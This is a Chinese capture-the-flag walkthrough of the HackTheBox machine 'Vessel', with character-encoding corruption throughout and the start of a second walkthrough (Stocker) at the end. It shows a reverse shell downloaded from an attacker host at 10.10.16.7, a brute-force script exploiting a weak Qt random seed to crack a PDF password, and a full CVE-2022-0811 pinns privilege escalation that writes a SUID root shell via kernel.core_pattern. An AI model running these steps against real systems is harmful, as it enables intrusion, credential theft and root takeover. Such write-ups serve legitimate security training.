åœ¨é¶æœºwww-dataç”¨æˆ·çš„shellç¯å¢ƒï¼Œä»æœ¬åœ°ä¸‹è½½php-reverse-shell.phpåˆ°/var/www/html/owa/owa-data/logsç›®å½•ä¸‹ wget http://10.10.16.7/php-reverse-shell.php å†æ¬¡æœ¬åœ°å¼€å¯ncç›‘å¬9898ç«¯å£ï¼Œç„¶åæœ¬åœ°è¿è¡Œå¦‚ä¸‹å‘½ä»¤è§¦å‘åå¼¹shellæ–‡ä»¶ curl http://openwebanalytics.vessel.htb/owa-data/logs/php-reverse-shell.php homeç›®å½•ä¸‹æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œethanå’Œstevenï¼Œè¿›å…¥/home/ethanç›®å½•æ²¡æƒé™ï¼Œäºæ˜¯è¿›/home/stevenç›®å½• åœ¨/home/stevenç›®å½•ä¸‹æœ‰ä¸€ä¸ªpasswordGeneratoræ–‡ä»¶ï¼Œåœ¨/home/steven/.notesæœ‰ä¸¤ä¸ªå¯ç–‘æ–‡ä»¶ï¼šnotes.pdfå’Œscreenshot.png æŠŠæ–‡ä»¶éƒ½å¤åˆ¶åˆ°/var/www/html/owa/owa-data/logs/ç›®å½•ä¸‹ï¼Œä¾¿äºè®¿é—®ä¸‹è½½ cp notes.pdf /var/www/html/owa/owa-data/logs/ cp screenshot.png /var/www/html/owa/owa-data/logs/ cp passwordGenerator /var/www/html/owa/owa-data/logs/ å›åˆ°æœ¬åœ°ï¼Œå°†ä¸‰ä¸ªæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ wget http://openwebanalytics.vessel.htb/owa-data/logs/notes.pdf wget http://openwebanalytics.vessel.htb/owa-data/logs/screenshot.png wget http://openwebanalytics.vessel.htb/owa-data/logs/passwordGenerator notes.pdfæ‰“å¼€éœ€è¦å¯†ç ï¼Œscreenshot.pngå¦‚ä¸‹ï¼Œå¯†ç é•¿åº¦32ä½ï¼Œè¿™åº”è¯¥æ˜¯passwordGeneratorçš„è¿è¡Œç•Œé¢ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œçœ‹åˆ°passwordGeneratoræ˜¯Windowsä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒPE32è¡¨ç¤ºPortable Executable 32-bit â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# file passwordGenerator passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows æŠŠpasswordGeneratoræ‹–åˆ°Windowsæœºå™¨ä¸­ï¼Œåç¼€åŠ ä¸Š.exeï¼ŒåŒå‡»è¿è¡Œï¼Œå¦‚ä¸‹å·¦ä¾§å¯é€‰æ‹©passwordé•¿åº¦ï¼Œå³ä¾§æœ‰ä¸‰ä¸ªé€‰é¡¹ALL Charactersã€Alphabetic(å­—æ¯)ã€Alphanumeric(å­—æ¯æ•°å­—)ï¼Œå‰é¢æ‹¿åˆ°çš„æˆªå›¾æ˜¯ç¬¬ä¸€ä¸ªé€‰é¡¹ ç‚¹å‡»Generate!ï¼Œå¼¹çª—æç¤ºç”Ÿæˆpasswordså‰è¦æ›´æ”¹é»˜è®¤valuesï¼Œçœ‹æ¥æ˜¯ç”Ÿæˆä¸äº†ï¼Œå¾—æ›²çº¿æ•‘å›½ï¼Œç ´è§£å®ƒ å…­ã€Pythonåç¼–è¯‘åœ¨Windowsç”¨WinHexï¼ˆå…¶ä»–16è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨å‡å¯ï¼‰æ‰“å¼€è¿™ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œåœ¨æœ«å°¾å¯ä»¥å‘ç°pyinstallerç¼–è¯‘çš„æ ‡å¿—MEI pythonåç¼–è¯‘å‚è€ƒï¼šhttps://blog.51cto.com/u_15060540/3888913 ä¸‹è½½pyinstxtractorè„šæœ¬ git clone https://github.com/extremecoders-re/pyinstxtractor æŠŠpasswordGeneratoræ”¾åˆ°ä¸‹å¥½çš„è„šæœ¬åŒç›®å½•ä¸‹ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor] â””â”€# python3 pyinstxtractor.py passwordGenerator [+] Processing passwordGenerator [+] Pyinstaller version: 2.1+ [+] Python version: 3.7 [+] Length of package: 34300131 bytes [+] Found 95 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_subprocess.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: pyi_rth_pyside2.pyc [+] Possible entry point: passwordGenerator.pyc [!] Warning: This script is running in a different Python version than the one used to build the executable. [!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling [!] Skipping pyz extraction [+] Successfully extracted pyinstaller archive: passwordGenerator You can now use a python decompiler on the pyc files within the extracted directory ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹è‡ªåŠ¨ç”Ÿæˆåå«passwordGenerator_extractedçš„ç›®å½• ç”¨uncompyle6åç¼–è¯‘ç›®æ ‡.pycæ–‡ä»¶ pip install uncompyle6 uncompyle6 passwordGenerator.pyc å¾—åˆ°æºç  # uncompyle6 version 3.9.0 # Python bytecode version base 3.7.0 (3394) # Decompiled from: Python 3.9.1+ (default, Feb 5 2021, 13:46:56) # [GCC 10.2.1 20210110] # Embedded file name: passwordGenerator.py from PySide2.QtCore import * from PySide2.QtGui import * from PySide2.QtWidgets import * from PySide2 import QtWidgets import pyperclip class Ui_MainWindow(object): def setupUi(self, MainWindow): if not MainWindow.objectName(): MainWindow.setObjectName('MainWindow') MainWindow.resize(560, 408) self.centralwidget = QWidget(MainWindow) self.centralwidget.setObjectName('centralwidget') self.title = QTextBrowser(self.centralwidget) self.title.setObjectName('title') self.title.setGeometry(QRect(80, 10, 411, 51)) self.textBrowser_2 = QTextBrowser(self.centralwidget) self.textBrowser_2.setObjectName('textBrowser_2') self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41)) self.generate = QPushButton(self.centralwidget) self.generate.setObjectName('generate') self.generate.setGeometry(QRect(140, 330, 261, 51)) self.PasswordLength = QSpinBox(self.centralwidget) self.PasswordLength.setObjectName('PasswordLength') self.PasswordLength.setGeometry(QRect(30, 130, 101, 21)) self.PasswordLength.setMinimum(10) self.PasswordLength.setMaximum(40) self.copyButton = QPushButton(self.centralwidget) self.copyButton.setObjectName('copyButton') self.copyButton.setGeometry(QRect(460, 260, 71, 61)) self.textBrowser_4 = QTextBrowser(self.centralwidget) self.textBrowser_4.setObjectName('textBrowser_4') self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41)) self.checkBox = QCheckBox(self.centralwidget) self.checkBox.setObjectName('checkBox') self.checkBox.setGeometry(QRect(250, 220, 16, 17)) self.checkBox.setCheckable(True) self.checkBox.setChecked(False) self.checkBox.setTristate(False) self.comboBox = QComboBox(self.centralwidget) self.comboBox.addItem('') self.comboBox.addItem('') self.comboBox.addItem('') self.comboBox.setObjectName('comboBox') self.comboBox.setGeometry(QRect(350, 130, 161, 21)) self.textBrowser_5 = QTextBrowser(self.centralwidget) self.textBrowser_5.setObjectName('textBrowser_5') self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41)) self.password_field = QLineEdit(self.centralwidget) self.password_field.setObjectName('password_field') self.password_field.setGeometry(QRect(100, 260, 351, 61)) MainWindow.setCentralWidget(self.centralwidget) self.statusbar = QStatusBar(MainWindow) self.statusbar.setObjectName('statusbar') MainWindow.setStatusBar(self.statusbar) self.retranslateUi(MainWindow) QMetaObject.connectSlotsByName(MainWindow) def retranslateUi(self, MainWindow): MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None)) self.title.setDocumentTitle('') self.title.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:20pt;\"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.textBrowser_2.setDocumentTitle('') self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:14pt;\"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None)) self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None)) self.textBrowser_4.setDocumentTitle('') self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:14pt;\"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.checkBox.setText('') self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None)) self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None)) self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None)) self.textBrowser_5.setDocumentTitle('') self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\"&gt;\\n&lt;html&gt;&lt;head&gt;&lt;meta name=\"qrichtext\" content=\"1\" /&gt;&lt;style type=\"text/css\"&gt;\\np, li { white-space: pre-wrap; }\\n&lt;/style&gt;&lt;/head&gt;&lt;body style=\" font-family:\\'MS Shell Dlg 2\\'; font-size:8.25pt; font-weight:400; font-style:normal;\"&gt;\\n&lt;p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"&gt;&lt;span style=\" font-size:16pt;\"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;', None)) self.password_field.setText('') class MainWindow(QMainWindow, Ui_MainWindow): def __init__(self): super(MainWindow, self).__init__() self.setupUi(self) self.setFixedSize(QSize(550, 400)) self.setWindowTitle('Secure Password Generator') self.password_field.setReadOnly(True) self.passlen() self.chars() self.hide() self.gen() def passlen(self): self.PasswordLength.valueChanged.connect(self.lenpass) def lenpass(self, l): global value value = l def chars(self): self.comboBox.currentIndexChanged.connect(self.charss) def charss(self, i): global index index = i def hide(self): self.checkBox.stateChanged.connect(self.status) def status(self, s): global status status = s == Qt.Checked def copy(self): self.copyButton.clicked.connect(self.copied) def copied(self): pyperclip.copy(self.password_field.text()) def gen(self): self.generate.clicked.connect(self.genButton) def genButton(self): try: hide = status if hide: self.password_field.setEchoMode(QLineEdit.Password) else: self.password_field.setEchoMode(QLineEdit.Normal) password = self.genPassword() self.password_field.setText(password) except: msg = QMessageBox() msg.setWindowTitle('Warning') msg.setText('Change the default values before generating passwords!') x = msg.exec_() self.copy() def genPassword(self): length = value char = index if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle('Error') msg.setText('Error while generating password!, Send a message to the Author!') x = msg.exec_() return password if __name__ == '__main__': app = QtWidgets.QApplication() mainwindow = MainWindow() mainwindow.show() app.exec_() # okay decompiling passwordGenerator.pyc å…³é”®ä»£ç æ˜¯ä¸‹é¢çš„ç”Ÿæˆå¯†ç å‡½æ•° def genPassword(self): length = value char = index if char == 0: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?' else: if char == 1: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' else: if char == 2: charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' else: try: qsrand(QTime.currentTime().msec()) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle('Error') msg.setText('Error while generating password!, Send a message to the Author!') x = msg.exec_() return password çœ‹åˆ°æ­¤å‡½æ•°æç„¶å¤§æ‚Ÿï¼Œchar=0å°±æ˜¯ALL Charactersï¼Œchar=1æ˜¯Alphabetic(å­—æ¯)ï¼Œchar=2æ˜¯Alphanumeric(å­—æ¯æ•°å­—)ï¼Œé‚£æ ¹æ®åˆšæ‰çœ‹åˆ°çš„screenshot.pngï¼Œåˆç†æ¨æµ‹ç¬¬ä¸‰è¡Œchar=index=0ï¼Œç¬¬äºŒè¡Œlength=value=32ã€‚æ ¹æ®passwordç”Ÿæˆé€»è¾‘ï¼Œcharsetæœ‰89ä¸ªå­—ç¬¦ï¼Œæ¯ä¸€ä½éƒ½ä»è¿™89ä¸ªå­—ç¬¦ä¸­ç”¨qrand()éšæœºä¸€ä¸ªï¼Œé‚£ä¹ˆ32ä½çš„passwordå°±æœ‰89çš„32æ¬¡æ–¹ç§å¯èƒ½ã€‚ä½†æ˜¯qsrand(QTime.currentTime().msec())ä¸­çš„.msec()è¿”å›æ—¶é—´çš„æ¯«ç§’éƒ¨åˆ†ï¼Œä¸”èŒƒå›´æ˜¯0-999ï¼Œæ‰€ä»¥éšæœºæ•°ç§å­åªæœ‰1000ç§å¯èƒ½ï¼Œå¯ä»¥çˆ†ç ´ã€‚ çˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼ˆç”±äºLinuxå’ŒWindowsçš„pythonç§Qtåº“å¯èƒ½ä¸å¤ªä¸€æ ·ï¼Œæ‰€ä»¥éœ€åœ¨Windowsä¸‹è¿è¡Œè„šæœ¬ï¼Œåœ¨Linuxä¸‹è¿è¡Œä¼šæ‰¾ä¸åˆ°pdfå¯†ç ï¼Œè€Œä¸”passwordGeneratorä¹Ÿæ˜¯Windowsç¨‹åºï¼‰ from PySide2.QtCore import qsrand, qrand def genPassword(ms: int) -&gt; str: length = 32 charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?' qsrand(ms) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) return password passwords = [genPassword(i) for i in range(1000)] with open('generated.txt', 'w') as f: f.write('\\n'.join(passwords)) æŠŠåˆšç”Ÿæˆçš„txtæ–‡ä»¶å½“ä½œå­—å…¸ï¼Œç”¨pdfcrackçˆ†ç ´ï¼Œæ‰¾åˆ°å¯†ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# pdfcrack -f notes.pdf -w generated.txt PDF version 1.6 Security Handler: Standard V: 2 R: 3 P: -1028 Length: 128 Encrypted Metadata: True FileID: c19b3bb1183870f00d63a766a1f80e68 U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000 O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86 found user-password: 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS' æ‰“å¼€pdfæ–‡ä»¶å¦‚ä¸‹ è·å¾—ç”¨æˆ·å¯†ç  Ethan b@mPRNSVTjjLKId1T sshè¿ä¸Š ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥è¯¢æ‹¥æœ‰suidæƒé™çš„æ–‡ä»¶ ethan@vessel:~$ find / -perm -u=s -type f 2&gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/fusermount /usr/bin/passwd /usr/bin/gpasswd /usr/bin/sudo /usr/bin/umount /usr/bin/newgrp /usr/bin/chfn /usr/bin/at /usr/bin/chsh /usr/bin/mount /usr/bin/su /usr/bin/pinns æœ€åä¸€ä¸ª/usr/bin/pinnsæœ€å¯ç–‘ï¼Œgoogleä¸€ä¸‹pinns exploitï¼Œçœ‹åˆ°å¦‚ä¸‹æ–‡ç«  https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/ ä¸ƒã€CVE-2022-0811æ¼æ´äº§ç”Ÿçš„åº”ç”¨æ˜¯CRI-Oï¼ˆä¸€ä¸ªåŸºäºKubernetesçš„å®æ—¶å®¹å™¨å¼•æ“ï¼‰ï¼Œæ¼æ´åç§°å«cr8escape åœ¨CRI-Oç‰ˆæœ¬1.19ï¼Œpinnsæ”¯æŒsysctl(system control)ï¼Œå³å¯ä»¥è¢«ç”¨æ¥è®¾ç½®å†…æ ¸å‚æ•°å€¼ï¼Œè€Œä¸”ä¸éœ€è¦ä»»ä½•è®¤è¯ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ å†…æ ¸å‚æ•°ï¼šhttps://docs.kernel.org/admin-guide/sysctl/kernel.html pinns -s kernel_parameter1=value1+kernel_parameter2=value2 å…¶ä¸­kernel_parameter1å’Œkernel_parameter2æ˜¯ä¸¤ä¸ªå‚æ•°åï¼Œä¸¤ä¸ªèµ‹å€¼è¯­å¥ä¸­é—´ç”¨â€œ+â€è¿æ¥ï¼Œpinnsåªæ£€æŸ¥kernel_parameter1ä»¥ç¡®ä¿æ˜¯ä¸€ä¸ªå®‰å…¨çš„å†…æ ¸å‚æ•°ï¼Œkernel_parameter2å¯ä»¥è¢«è®¾ç½®ä¸ºä»»æ„çš„å†…æ ¸å‚æ•° ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹CRI-Oç‰ˆæœ¬æ˜¯1.19.6ï¼Œå±äºæ¼æ´è¦†ç›–èŒƒå›´ ethan@vessel:~$ crio --version crio version 1.19.6 Version: 1.19.6 GitCommit: c12bb210e9888cf6160134c7e636ee952c45c05a GitTreeState: clean BuildDate: 2022-03-15T18:18:24Z GoVersion: go1.15.2 Compiler: gc Platform: linux/amd64 Linkmode: dynamic å‚è€ƒä¸Šé¢crowdstrikeçš„CVEåˆ†ææ–‡ç« ï¼Œæ–‡ç« ä¸­ç”¨çš„å†…æ ¸å‚æ•°æ˜¯kernel.shm_rmid_forcedå’Œkernel.core_pattern kernel.shm_rmid_forced=1è¡¨ç¤ºæ²¡æœ‰ç”¨æˆ·å ç”¨ã€ä¸”è¿›ç¨‹å·²è¢«ç»ˆæ­¢çš„å…±äº«å†…å­˜æ®µä¼šè¢«è‡ªåŠ¨é”€æ¯ kernel.core_patternçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¦‚æœæ˜¯â€œ|â€ï¼Œé‚£ä¹ˆåé¢çš„å­—ç¬¦ä¸²å°±ä¼šå½“ä½œå‘½ä»¤è¢«æ‰§è¡Œ æ­¤å¤„æœ‰ä¸ªæ¦‚å¿µï¼šå†…æ ¸è½¬å‚¨ï¼ˆcoredumpï¼‰ï¼Œåœ¨è¿›ç¨‹å‘ç”Ÿé—®é¢˜æ—¶ä¿å­˜è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ å‚è€ƒï¼šhttps://www.jianshu.com/p/191a62f4f6b9?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation ç›˜ä¸€ç›˜é€»è¾‘ï¼šæŸä¸€è¿›ç¨‹å‘ç”Ÿé—®é¢˜â†’è§¦å‘å†…æ ¸è½¬å‚¨â†’å†…æ ¸è½¬å‚¨ä¼šæ ¹æ®kernel.core_patternçš„è®¾ç½®ç¡®å®šå­˜å‚¨ä¿¡æ¯çš„æ–‡ä»¶â†’kernel.core_patternç¬¬ä¸€ä¸ªå­—ç¬¦â€œ|â€åçš„å­—ç¬¦ä¸²ä¼šå½“ä½œå‘½ä»¤è¢«æ‰§è¡Œ ä¸­é—´çš„éƒ¨åˆ†æ“ä½œç³»ç»Ÿè‡ªåŠ¨å¤„ç†ä¸ç”¨ç®¡ï¼Œåªéœ€è¦æ“ä½œç¬¬ä¸€æ­¥å’Œæœ€åä¸€æ­¥ï¼Œå³æƒ³åŠæ³•è®©æŸä¸€è¿›ç¨‹å‡ºé—®é¢˜ï¼Œå¹¶ä¸”é¢„å…ˆè®¾ç½®å¥½kernel.core_patternçš„å€¼ï¼Œä¾¿äºæ‰§è¡Œå‘½ä»¤ è®©æŸä¸€è¿›ç¨‹å‡ºé—®é¢˜ï¼šå¯ä»¥ç”¨killè¿›ç¨‹çš„æ–¹å¼å®ç° é¢„å…ˆè®¾ç½®kernel.core_patternçš„å€¼ï¼šæ­¤å¤„æ˜¯pinnsæä¾›äº†ä¿®æ”¹å†…æ ¸å‚æ•°çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ç”¨pinnså»è®¾ç½®ï¼Œæ ¼å¼å¦‚ä¸‹ pinns -s kernel_parameter1=value1+kernel_parameter2=value2 æ³¨ï¼šä¿è¯kernel_parameter1=value1æ˜¯åˆæ³•èµ‹å€¼ï¼Œkernel_parameter2ä½ç½®æ˜¯kernel.core_patternï¼Œvalue2ä½ç½®æ˜¯â€œ|â€å¼€å¤´ï¼Œåé¢è·Ÿæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤æˆ–è€…è„šæœ¬æ–‡ä»¶ äºæ˜¯ç”¨æ„é€ å¦‚ä¸‹å‘½ä»¤ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' å…ˆæŸ¥çœ‹æƒ³è¦ä¿®æ”¹çš„ä¸¤ä¸ªæ–‡ä»¶ ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced |/usr/share/apport/apport %p %s %c %d %P %E 0 æ‰§è¡Œæ„é€ å¥½çš„å‘½ä»¤ï¼Œå‘ç°å¦‚ä¸‹æŠ¥é”™ï¼Œå¹¶ä¸”æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶ï¼Œæ²¡æœ‰å˜åŒ– ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' [pinns:e]: Path for pinning namespaces not specified: Invalid argument æŸ¥çœ‹pinnxæºç ï¼Œå‘ç°æŠ¥é”™çš„åŸå›  pinnsæºç ï¼šhttps://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c å‘ç°å¦‚ä¸‹ä¸¤ä¸ªé€»è¾‘ä»£ç æ®µ static const struct option long_options[] = { {\"help\", no_argument, NULL, 'h'}, {\"uts\", optional_argument, NULL, 'u'}, {\"ipc\", optional_argument, NULL, 'i'}, {\"net\", optional_argument, NULL, 'n'}, {\"user\", optional_argument, NULL, 'U'}, {\"cgroup\", optional_argument, NULL, 'c'}, {\"dir\", required_argument, NULL, 'd'}, {\"filename\", required_argument, NULL, 'f'}, {\"sysctl\", optional_argument, NULL, 's'}, }; if (!pin_path) { pexit(\"Path for pinning namespaces not specified\"); } if (!filename) { pexit(\"Filename for pinning namespaces not specified\"); } if (directory_exists_or_create(pin_path) &lt; 0) { nexitf(\"%s exists but is not a directory\", pin_path); } if (num_unshares == 0) { nexit(\"No namespace specified for pinning\"); } if (unshare(unshare_flags) &lt; 0) { pexit(\"Failed to unshare namespaces\"); } ç»“åˆå…¨éƒ¨ä»£ç åˆ†æï¼Œæ•´ä½“è¦æ±‚å°±æ˜¯ï¼š 1.è¦æœ‰-då‚æ•°ï¼Œä¸”å‚æ•°å€¼æŒ‡å®šç›®å½•è¦å­˜åœ¨æˆ–è€…å¯ä»¥è¢«åˆ›å»ºï¼› 2.è¦æœ‰-få‚æ•°ï¼Œå‚æ•°å€¼ä»»æ„ï¼Œä½†ä¸èƒ½ä¸ºç©ºï¼› 3.-u -i -n -Uå››ä¸ªå‚æ•°è‡³å°‘æœ‰ä¸€ä¸ªï¼ˆæ­¤å¤„ç¬”è€…åªè¯•äº†ä¸€ä¸ª-Uï¼Œç†è®ºä¸Šä¿è¯num_unsharesä¸ä¸º0å³å¯ï¼‰ã€‚ é‡æ–°æ„é€ ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/dev/shm/exp.sh #' -f file -d /dev/shm -U [pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted è™½æœ‰æŠ¥é”™ï¼Œä½†ä¸å½±å“ï¼Œå†æ¬¡æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶å†…å®¹ï¼Œä¿®æ”¹æˆåŠŸ ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced |/dev/shm/exp.sh # 1 å‘/dev/shm/exp.shå†™å…¥æƒ³è¦æ‰§è¡Œçš„ä»£ç ï¼ˆæ­¤å¤„å°±æ˜¯æŠŠ/bin/bashå¤åˆ¶åˆ°/tmp/wa0erï¼Œå¹¶ç»™äºˆ4755æƒé™ï¼Œä¹Ÿå°±æ˜¯suidå’Œ755æƒé™ï¼‰ï¼Œå¹¶ç»™/dev/shm/exp.shæ·»åŠ æ‰§è¡Œæƒé™ ethan@vessel:~$ echo -e '#!/bin/bash\\ncp /bin/bash /tmp/wa0er\\nchown root:root /tmp/wa0er\\nchmod 4755 /tmp/wa0er' | tee /dev/shm/exp.sh #!/bin/bash cp /bin/bash /tmp/wa0er chown root:root /tmp/wa0er chmod 4755 /tmp/wa0er ethan@vessel:~$ chmod +x /dev/shm/exp.sh æ‰§è¡Œsleepå‘½ä»¤ï¼Œå¹¶ç”¨killallç»ˆæ­¢è¿›ç¨‹ï¼Œ-s SIGSEGVè¡¨ç¤ºè®¿é—®æœªåˆ†é…ç»™è‡ªå·±çš„å†…å­˜ï¼Œæ­¤å¤„å¯çœ‹åˆ°å›æ˜¾(core dumped)ï¼Œå³è¿›å…¥å†…æ ¸è½¬å‚¨ ethan@vessel:~$ sleep 100&amp; [1] 1676 ethan@vessel:~$ killall -s SIGSEGV sleep [1]+ Segmentation fault (core dumped) sleep 100 æŸ¥çœ‹/tmp/wa0eræ–‡ä»¶æƒé™ï¼Œå·²æœ‰suidæƒé™ ethan@vessel:~$ ls -l /tmp/wa0er -rwsr-xr-x 1 root root 1183448 Mar 27 13:07 /tmp/wa0er æ‰§è¡Œ/tmp/wa0er -pææƒï¼ŒæˆåŠŸè·å–rootæƒé™ Overï¼ å‚è€ƒhttps://blog.csdn.net/qq_45894840/article/details/127844085 https://0xdf.gitlab.io/2023/03/25/htb-vessel.html","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Stocker","slug":"HTB5-Stocker","date":"2023-03-22T12:47:00.000Z","updated":"2023-08-31T07:56:00.151Z","comments":true,"path":"posts/77989ccd.html","link":"","permalink":"https://wa0er.github.io/posts/77989ccd.html","excerpt":"","text":"HTB-Stockerä¿¡æ¯æ”¶é›†nmap â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢] â””â”€# nmap -sC -sV -oA stocker 10.10.11.196 Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 22:42 EST Nmap scan report for stocker.htb (10.10.11.196) Host is up (0.15s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 